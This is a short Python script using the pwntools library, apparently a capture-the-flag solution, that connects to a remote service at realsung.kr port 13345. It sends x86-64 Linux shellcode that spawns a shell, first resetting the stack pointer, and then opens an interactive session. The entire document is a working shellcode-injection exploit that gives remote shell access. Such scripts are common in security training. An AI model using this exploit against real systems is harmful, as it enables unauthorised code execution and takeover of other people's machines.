from pwn import *
context.clear(arch='amd64', os='linux')
p = remote("realsung.kr", 13345)

shellcode = shellcraft.linux.sh()
code='''lea rsp ,[rip + 0x100];'''

shellcode=asm(code)+asm(shellcode)

p.sendline(shellcode)
p.interactive()